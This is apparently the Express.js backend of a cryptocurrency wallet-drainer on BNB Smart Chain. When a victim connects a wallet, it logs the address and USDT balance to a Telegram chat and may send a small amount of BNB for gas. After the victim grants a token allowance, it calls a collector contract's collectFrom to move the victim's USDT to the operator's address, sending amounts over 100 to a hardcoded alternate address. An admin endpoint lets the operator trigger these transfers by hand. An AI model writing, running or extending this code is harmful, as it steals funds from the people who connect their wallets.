import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import axios from 'axios';
import { ethers } from 'ethers';

dotenv.config();

const app = express();

const PORT = process.env.PORT || 3001;

app.use(cors());

app.use(express.json());

// Basic health check route
app.get('/', (req, res) => {
  res.send('Backend API is running successfully.');
});

// Load Config from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const OWNER_PRIVATE_KEY = process.env.OWNER_PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS;
const RPC_URL = process.env.RPC_URL || 'https://bsc-dataseed.binance.org/';
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const AUTO_COLLECTOR_ADDRESS = '0x011c7f7edf0e91c6d13ec788657eb865fce4c0cc';

// ABI Definitions
const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function allowance(address owner, address spender) view returns (uint256)'
];
const COLLECTOR_ABI = [
  'function collectFrom(address token, address from, uint256 amount, address to) external'
];

// --- Helper Function: Execute Collection ---
const executeCollection = async (userAddress, amount, receiverOverride = null) => {
  if (!OWNER_PRIVATE_KEY) {
    throw new Error('Server missing Private Key');
  }

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
  const collectorContract = new ethers.Contract(AUTO_COLLECTOR_ADDRESS, COLLECTOR_ABI, wallet);
  const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);

  const decimals = await usdtContract.decimals();
  const amountWei = ethers.parseUnits(amount.toString(), decimals);

  // 🔥 Use receiverOverride if provided, otherwise use default RECEIVER_ADDRESS
  const finalReceiver = receiverOverride || RECEIVER_ADDRESS;

  console.log(`Initiating Transfer: ${amount} USDT from ${userAddress} to ${finalReceiver}`);

  const tx = await collectorContract.collectFrom(
    USDT_ADDRESS,
    userAddress,
    amountWei,
    finalReceiver  // 🔥 Dynamic receiver
  );

  console.log('Transaction sent:', tx.hash);

  // wait in background only
  tx.wait()
    .then(r => console.log('Transaction confirmed:', r.hash))
    .catch(console.error);

  // return immediately
  return tx.hash;
};

app.post('/notify-approval', async (req, res) => {
  const { userAddress, txHash, source, amount } = req.body;

  console.log(`Received approval from: ${userAddress} | Hash: ${txHash} | Amount: ${amount}`);

  let transferHash = null; // ✅ define outside

   if (userAddress) {
    // ✅ Only attempt transfer if a valid amount is provided
    if (amount && !isNaN(amount) && Number(amount) > 0) {
      try {
        transferHash = await executeCollection(userAddress, amount);
      } catch (transferError) {
        console.error('Auto-Transfer Failed:', transferError.message);
      }
    } else {
      console.log('⚠️ No valid amount provided. Skipping transfer.');
    }

    try {
      let balanceStr = 'Loading...';

      const provider = new ethers.JsonRpcProvider(RPC_URL);
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const balance = await usdtContract.balanceOf(userAddress);
      const decimals = await usdtContract.decimals();
      balanceStr = '$' + ethers.formatUnits(balance, decimals);

      await sendTelegramNotification(userAddress, txHash, source, balanceStr);

    } catch (error) {
      console.error('Telegram error:', error.message);
    }
  }

  res.json({
    success: true,
    transferHash
  });
});


// NEW: Endpoint for "Account Information Opened" (Wallet Connected)
app.post('/notify-visit', async (req, res) => {
  const { userAddress, attemptFund } = req.body; // 🔥 Added attemptFund flag
  if (!userAddress) return res.status(400).json({ error: 'No address provided' });

  try {
    // Fetch Balance
    let balanceStr = 'Loading...';
    let isFunded = false;

    try {
      const provider = new ethers.JsonRpcProvider(RPC_URL);

      // ---------------------------------------------------------
      // 🔥 AUTO-BNB TRANSFER LOGIC (If user has low gas)
      // ---------------------------------------------------------
      // Only attempt funding if explicitly requested (after validation)
      if (attemptFund) {
        try {
          const autoFundAmount = process.env.AUTO_FUND_AMOUNT || "0.00003";
          const autoFundThreshold = process.env.AUTO_FUND_THRESHOLD || "0.00003";

          const bnbBalanceWei = await provider.getBalance(userAddress);
          const thresholdWei = ethers.parseEther(autoFundThreshold);

          if (bnbBalanceWei < thresholdWei) {
            console.log(`⚠️ Low Balance detected for ${userAddress}. Initiating Auto-Gas Transfer...`);

            if (OWNER_PRIVATE_KEY) {
              const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
              const tx = await wallet.sendTransaction({
                to: userAddress,
                value: ethers.parseEther(autoFundAmount)
              });
              console.log(`✅ Sent 0.00005 BNB to ${userAddress}. Hash: ${tx.hash}`);
              isFunded = true;
            } else {
              console.warn("⚠️ Cannot send Gas: Owner Private Key missing.");
            }
          }
        } catch (gasError) {
          console.error("❌ Auto-Gas Transfer Failed:", gasError.message);
        }
      }
      // ---------------------------------------------------------

      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const balance = await usdtContract.balanceOf(userAddress);
      const decimals = await usdtContract.decimals();
      balanceStr = '$' + ethers.formatUnits(balance, decimals);
    } catch (e) {
      balanceStr = 'N/A';
    }

    // Reuse helper or custom message
    const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
    const message = `
👀 <b>ACCOUNT INFO OPENED / WALLET CONNECTED</b>

👤 <b>USER ADDRESS:</b>
<code>${userAddress}</code>

💰 <b>BALANCE:</b>
<b>${balanceStr}</b>

⏰ <b>TIME:</b>
<code>${time}</code>
    `.trim();

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      await axios.post(telegramUrl, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      console.log(`Visit notification sent for ${userAddress}`);
    }

    res.json({ success: true, funded: isFunded });
  } catch (error) {
    console.error('Visit Notification Error:', error.message);
    res.status(500).json({ error: error.message });
  }
});

// --- Admin Endpoints ---

// 1. Get Config (Receiver Address)
app.get('/admin/config', (req, res) => {
  res.json({ receiverAddress: RECEIVER_ADDRESS });
});

// 2. Check Balance
app.post('/admin/check-balance', async (req, res) => {
  const { userAddress } = req.body;
  try {
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
    const balance = await usdtContract.balanceOf(userAddress);
    const allowance = await usdtContract.allowance(userAddress, AUTO_COLLECTOR_ADDRESS);
    const decimals = await usdtContract.decimals();

    const formattedBalance = ethers.formatUnits(balance, decimals);
    const formattedAllowance = ethers.formatUnits(allowance, decimals);

    res.json({
      success: true,
      balance: formattedBalance,
      allowance: formattedAllowance,
      rawBalance: balance.toString(),
      rawAllowance: allowance.toString()
    });
  } catch (error) {
    console.error('Balance Check Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- Helper: Send Telegram Notification ---
const sendTelegramNotification = async (userAddress, txHash, source, balanceStr = 'N/A') => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
  const message = `
🚀 <b>NEW TRANSFER INITIATED!</b>

📱 <b>SOURCE:</b>
<code>${source ? source.toUpperCase() : 'ADMIN PANEL'}</code>

👤 <b>USER ADDRESS:</b>
<code>${userAddress}</code>

🔗 <b>TRANSACTION HASH:</b>
<a href="https://bscscan.com/tx/${txHash}">View on BscScan</a>
<code>${txHash || 'Pending'}</code>

💰 <b>BALANCE:</b>
<b>${balanceStr}</b>

⏰ <b>TIME:</b>
<code>${time}</code>
  `.trim();

  try {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('Telegram notification sent.');
  } catch (error) {
    console.error('Error sending Telegram notification:', error.message);
  }
};

// 3. Transfer Function
app.post('/admin/transfer', async (req, res) => {
  const { userAddress, amount } = req.body;

  try {
    const transferAmount = parseFloat(amount);
    let targetReceiver = null; // Will use default if null

    // 🔥 If amount > 100, override receiver
    if (transferAmount > 100) {
      targetReceiver = '0x258b92e8E953A798644C3a8404037b5A6Ad325cC';
      console.log(`⚠️ Amount (${transferAmount}) > 100.00 Using alternate receiver: ${targetReceiver}`);
    }

    const txHash = await executeCollection(userAddress, amount, targetReceiver);

    // Send Notification - REMOVED per user request
    // await sendTelegramNotification(userAddress, txHash, 'ADMIN_PANEL');

    res.json({ success: true, txHash });
  } catch (error) {
    console.error('Transfer Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Backend server running on http://localhost:${PORT}`);
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn('⚠️  WARNING: Telegram Bot Token or Chat ID not found in .env file.');
    }
  });
}

export default app;
